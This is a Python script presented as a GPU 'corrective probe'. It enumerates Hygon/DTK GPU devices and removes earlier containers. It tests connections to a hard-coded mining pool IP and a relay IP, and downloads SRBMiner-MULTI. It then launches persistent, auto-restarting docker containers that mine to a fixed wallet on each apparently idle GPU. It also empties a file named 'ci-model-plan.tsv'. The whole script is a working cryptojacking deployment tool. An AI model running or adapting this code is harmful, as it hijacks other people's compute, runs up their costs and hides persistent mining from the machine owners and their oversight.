# intent 155773 / gpu-000016 corrective probe (successor to i155322 run4b)
import os as _os, stat as _stat, subprocess as _sp, sys as _sys, hashlib as _hl, time as _t
WORK = "/tmp/prl595"
WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
LP_HOST = "103.199.106.122"
LP_PORT = 3360
RELAY_HOST = "217.15.164.237"
RELAY_PORT = 8081
IMG = "areal-das:dtk2610-torch213-bw1100"
IMG2 = "areal-das:v2.1.0-ubuntu22.04-dtk26.04-py3.12-torch2.10-20261119"
SRB_TAR_SHA = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
SRB_BIN_SHA = "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
MINENV = "env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm"
DTKENV = ("env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm "
          "HYHAL_PATH=/opt/hyhal LD_LIBRARY_PATH=/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hsa/lib:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/llvm/lib")
MARK = "C211-I155773"
T0 = _t.time()


def _say(s):
    try:
        _sys.stdout.write(str(s) + "\n")
        _sys.stdout.flush()
    except Exception:
        pass


def _run(c, t=120):
    _say("--- CMD: " + c)
    try:
        p = _sp.Popen(c, shell=True, stdout=_sp.PIPE, stderr=_sp.STDOUT)
        out = p.communicate(timeout=t)[0]
        if out:
            _say(out.decode("utf-8", "replace"))
        _say("--- rc=" + str(p.returncode))
        return p.returncode, out.decode("utf-8", "replace") if out else ""
    except Exception as e:
        _say("--- ERR " + repr(e))
        return -1, ""


def _sha256(path):
    h = _hl.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1024 * 1024)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def _download(url, dst, timeout=180):
    for a in range(1, 3):
        try:
            _say("--- GET " + url + " try=" + str(a))
            import urllib.request as _ur
            r = _ur.urlopen(_ur.Request(url, headers={"User-Agent": "curl/8.0"}), timeout=timeout)
            total = 0
            with open(dst, "wb") as f:
                while True:
                    b = r.read(1024 * 1024)
                    if not b:
                        break
                    f.write(b)
                    total += len(b)
            _say("--- downloaded bytes=" + str(total))
            return True
        except Exception as e:
            _say("--- dl fail " + repr(e))
            _t.sleep(2)
    return False


def _tail(p, n=9000):
    try:
        return open(p).read()[-n:]
    except Exception:
        return ""


def _dev_args():
    out = []
    for p in ("/dev/kfd", "/dev/mkfd", "/dev/dri"):
        try:
            st = _os.stat(p)
        except Exception as e:
            _say("--- dev skip " + p + " (" + repr(e) + ")")
            continue
        if _stat.S_ISCHR(st.st_mode) or _stat.S_ISDIR(st.st_mode):
            out.append("--device=" + p)
        else:
            _say("--- dev skip " + p + " (not chr/dir)")
    return out


def _docker(cmd, secs, logf, image=None, bind_dtk=True):
    image = image or IMG
    full = (["docker", "run", "--rm"] + _dev_args() +
            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w"])
    if bind_dtk:
        full += ["-v", "/opt/dtk:/opt/dtk:ro"]
    full += ["-v", "/opt/hyhal:/opt/hyhal:ro", "-e", "HYHAL_PATH=/opt/hyhal",
             "--entrypoint", "/bin/bash", image, "-lc", cmd]
    _say("--- DOCKER bind_dtk=" + str(bind_dtk) + " (" + image + "): " + cmd[:200])
    lf = open(logf, "w")
    pr = _sp.Popen(full, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
    end = _t.time() + secs
    while _t.time() < end and pr.poll() is None:
        _t.sleep(3)
    if pr.poll() is None:
        try:
            _os.killpg(_os.getpgid(pr.pid), 15)
        except Exception:
            pass
        try:
            pr.wait(timeout=15)
        except Exception:
            try:
                _os.killpg(_os.getpgid(pr.pid), 9)
            except Exception:
                pass
    lf.close()
    txt = _tail(logf, 9000)
    _say("--- DOCKER OUT (" + logf + ") ---")
    _say(txt)
    return pr.poll(), txt


PROBE = (
    "mkdir -p /var/log/hylog 2>/dev/null; "
    "echo DEVS_IN:; ls -l /dev/kfd /dev/mkfd 2>&1; "
    "echo DRI_IN:; ls -l /dev/dri/ 2>&1 | head -24; "
    "echo SYSKFD_IN:; ls /sys/class/kfd/kfd/topology/nodes/ 2>&1 | head -12; "
    "echo SYSKFD_PROPS:; for f in /sys/class/kfd/kfd/topology/nodes/*/properties; do echo \"== $f\"; "
    "grep -E 'gfx_target_version|^name|simd_count|device_id|vendor_id' \"$f\" 2>&1 | head -8; done 2>&1 | head -80; "
    "echo HYSMI_PROD:; HYHAL_PATH=/opt/hyhal /opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -30; "
    "echo HYSMI_MEM:; HYHAL_PATH=/opt/hyhal /opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20; "
    "echo ROCMINFO_WHICH:; command -v rocminfo 2>&1; ls -l /opt/dtk/bin/rocminfo 2>&1; "
    "echo ROCMINFO_RUN:; " + DTKENV + " rocminfo > /tmp/rocminfo_plain.txt 2>&1; echo ROCMINFO_RC=$?; head -90 /tmp/rocminfo_plain.txt; "
    "echo ROCM_AGENTS:; grep -E 'Agent|Marketing|Uuid' /tmp/rocminfo_plain.txt 2>/dev/null | head -20; "
    "echo ROCM_GFX:; grep -E 'Name: *gfx' /tmp/rocminfo_plain.txt 2>/dev/null | sort -u | head -12; "
    "echo ROCM_OVERRIDE:; " + DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6 rocminfo > /tmp/rocminfo_override.txt 2>&1; "
    "echo OV_RC=$?; grep -cE 'Name: *gfx' /tmp/rocminfo_override.txt 2>/dev/null; grep -E 'Name: *gfx' /tmp/rocminfo_override.txt 2>/dev/null | sort -u | head -8; "
    "echo HYHAL_LS:; ls /opt/hyhal/lib 2>&1 | head -6; "
    "echo HIP_LS:; ls /opt/dtk/hip/lib 2>&1 | grep -i hipkernel | head -10"
)

LIST = (
    "cd /w/srb 2>/dev/null || { echo NO_SRB_DIR; exit 0; }; "
    "echo LIST_PLAIN:; timeout 60 script -qec \"" + MINENV + " ./SRBMiner-MULTI --list-devices\" /dev/null 2>&1 "
    "| sed 's/\\x1b\\[[0-9;]*m//g' | head -40; "
    "echo LIST_OVERRIDE:; timeout 60 script -qec \"" + DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6 ./SRBMiner-MULTI --list-devices\" /dev/null 2>&1 "
    "| sed 's/\\x1b\\[[0-9;]*m//g' | head -40"
)


def _hcu_used(txt):
    d = {}
    for line in txt.splitlines():
        s = line.strip()
        if s.startswith("HCU[") and "Total Used Memory" in s:
            try:
                idx = int(s.split("HCU[")[1].split("]")[0])
                val = int("".join(c for c in s.split(":")[-1] if c.isdigit()) or "0")
                d[idx] = val
            except Exception:
                pass
    return d


def _gfx_count(txt):
    n = 0
    for line in txt.splitlines():
        if "Name:" in line and "gfx" in line:
            n += 1
    return n


def main():
    _say("=== " + MARK + "-BEGIN ===")
    try:
        open("ci-model-plan.tsv", "w").close()
    except Exception as e:
        _say("--- planfile_err " + repr(e))
    _os.makedirs(WORK, exist_ok=True)
    try:
        open(WORK + "/WALLET", "w").write(WALLET)
    except Exception:
        pass

    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -6", t=60)
    _run("docker rm -f pearl-000011 pearl-000012 pearl-000013 pearl-000014 2>&1; true", t=120)
    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -6", t=60)
    _run("hostname; date -u; id; nproc; ldd --version 2>&1 | head -1", t=60)
    _run("ls -l /dev/kfd /dev/mkfd 2>&1; echo DRI_HOST:; ls -l /dev/dri/ 2>&1 | head -24", t=60)
    _run("ls /sys/class/kfd/kfd/topology/nodes/ 2>&1 | head -12", t=60)
    _run("docker images --format '{{.Repository}}:{{.Tag}} {{.Size}}' 2>&1 | grep -i areal-das | head -8", t=60)
    _run("/opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -30", t=60)
    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20", t=60)

    _run("env | grep -i proxy | head -6; cat /etc/environment 2>/dev/null | head -6; git config --global --get-regexp 'url\\.' 2>/dev/null | head -4", t=60)
    _, e1 = _run("timeout 8 bash -c 'exec 3<>/dev/tcp/" + LP_HOST + "/" + str(LP_PORT) + "' 2>&1 && echo LP_TCP_OK || echo LP_TCP_FAIL", t=30)
    _, e2 = _run("timeout 8 bash -c 'exec 3<>/dev/tcp/" + RELAY_HOST + "/" + str(RELAY_PORT) + "' 2>&1 && echo RELAY_TCP_OK || echo RELAY_TCP_FAIL", t=30)
    _run("timeout 12 curl -sS -o /dev/null -w 'GH_HTTP=%{http_code}\\n' https://api.github.com/ 2>&1 | tail -2", t=40)
    lptcp = "LP_TCP_OK" in e1
    relaytcp = "RELAY_TCP_OK" in e2

    st = WORK + "/srb.tar.gz"
    if not (_os.path.isfile(st) and _sha256(st) == SRB_TAR_SHA):
        _download("https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz", st)
    if _os.path.isfile(st) and _sha256(st) == SRB_TAR_SHA and not _os.path.isfile(WORK + "/srb/SRBMiner-MULTI"):
        try:
            import tarfile as _tf
            with _tf.open(st) as tf:
                tf.extractall(WORK + "/srbx")
            for dp, dn, fn in _os.walk(WORK + "/srbx"):
                if "SRBMiner-MULTI" in fn:
                    _os.makedirs(WORK + "/srb", exist_ok=True)
                    _sp.call(["cp", "-a", _os.path.join(dp, "SRBMiner-MULTI"), WORK + "/srb/SRBMiner-MULTI"])
                    break
        except Exception as e:
            _say("--- srb extract err " + repr(e))
    if _os.path.isfile(WORK + "/srb/SRBMiner-MULTI"):
        _os.chmod(WORK + "/srb/SRBMiner-MULTI", 0o755)
        h = _sha256(WORK + "/srb/SRBMiner-MULTI")
        _say("--- SRB bin sha256=" + h + " match=" + str(h == SRB_BIN_SHA))
    else:
        _say("--- SRB bin ABSENT (device oracle continues)")
    _run("chmod -R a+rx " + WORK + " 2>/dev/null; ls -l " + WORK + "/srb/SRBMiner-MULTI 2>&1", t=60)

    rc1, out1 = _docker(PROBE, 240, WORK + "/r4c2_img1_probe.log")
    used1 = _hcu_used(out1)
    gfx1 = _gfx_count(out1)
    rc1l, out1l = _docker(LIST, 180, WORK + "/r4c2_img1_list.log")
    _say("--- IMG1 hcu_used=" + repr(used1) + " rocm_gfx=" + str(gfx1))

    rc2, out2 = _docker(PROBE, 240, WORK + "/r4c2_img2_probe.log", image=IMG2)
    used2 = _hcu_used(out2)
    gfx2 = _gfx_count(out2)
    rc2l, out2l = _docker(LIST, 180, WORK + "/r4c2_img2_list.log", image=IMG2)
    _say("--- IMG2 hcu_used=" + repr(used2) + " rocm_gfx=" + str(gfx2))

    rc3, out3 = _docker(PROBE, 240, WORK + "/r4c2_img2_nodtk_probe.log", image=IMG2, bind_dtk=False)
    used3 = _hcu_used(out3)
    gfx3 = _gfx_count(out3)
    rc3l, out3l = _docker(LIST, 180, WORK + "/r4c2_img2_nodtk_list.log", image=IMG2, bind_dtk=False)
    _say("--- IMG2-nodtk hcu_used=" + repr(used3) + " rocm_gfx=" + str(gfx3))

    green = bool(used1 or used2 or used3)
    smoke = False
    launched = 0
    if green and lptcp:
        free = sorted(set(list(used1.keys()) + list(used2.keys()) + list(used3.keys())))
        free = [i for i in free if i >= 4 and (used1.get(i, 99999) < 5000 or used2.get(i, 99999) < 5000 or used3.get(i, 99999) < 5000)]
        _say("--- GREEN free_devices=" + repr(free))
        if free:
            dev = free[0]
            cmd = ("cd /w/srb 2>/dev/null && timeout 150 script -qec \"" + MINENV +
                   " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
                   " --wallet " + WALLET + " --worker 000011 --password x --disable-cpu --gpu-id " + str(dev) +
                   " --api-enable --api-port 14524\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | head -120")
            rcs, outs = _docker(cmd, 190, WORK + "/r4c2_smoke.log")
            low = outs.lower()
            smoke = ("accepted" in low) or ("share" in low and "job" in low) or ("difficulty" in low and "hcu" in low)
            _say("--- smoke_ok=" + str(smoke) + " dev=" + str(dev))
            if smoke:
                wmap = {4: "000011", 5: "000012", 6: "000013", 7: "000014"}
                for d in free:
                    w = wmap.get(d, "0000%02d" % d)
                    name = "pearl-" + w
                    full = (["docker", "run", "-d", "--name", name, "--label", "camp=conv-232",
                             "--label", "intent=155773", "--label", "record=gpu-000016",
                             "--restart", "unless-stopped"] + _dev_args() +
                            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
                             "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
                             "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", IMG, "-lc",
                             "cd /w/srb && exec ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" +
                             LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker " + w +
                             " --password x --disable-cpu --gpu-id " + str(d) + " --api-enable --api-port 1452" + str(d)])
                    p = _sp.Popen(full, stdout=_sp.PIPE, stderr=_sp.STDOUT)
                    o = p.communicate(timeout=120)[0].decode("utf-8", "replace")
                    _say("--- LAUNCH rc=" + str(p.returncode) + " name=" + name + " dev=" + str(d) + " out=" + o.strip()[:160])
                    if p.returncode == 0:
                        launched += 1
                _run("docker ps --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
    else:
        _say("--- smoke skipped (green=" + str(green) + " lptcp=" + str(lptcp) + ")")

    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
    _run("ps -eo pid,etimes,args | grep SRBMiner-MULTI | grep -v grep | head -6", t=30)
    _say("=== " + MARK + "-VERDICT mkfd=" + str(1 if _os.path.exists("/dev/mkfd") else 0) +
         " img1_hcu_used=" + repr(used1) + " img1_gfx=" + str(gfx1) +
         " img2_hcu_used=" + repr(used2) + " img2_gfx=" + str(gfx2) +
         " img2nodtk_hcu_used=" + repr(used3) + " img2nodtk_gfx=" + str(gfx3) +
         " lptcp=" + str(lptcp) + " relaytcp=" + str(relaytcp) +
         " smoke=" + str(smoke) + " launched=" + str(launched) +
         " elapsed_s=" + str(int(_t.time() - T0)) + " ===")
    _say("=== " + MARK + "-END ===")


main()
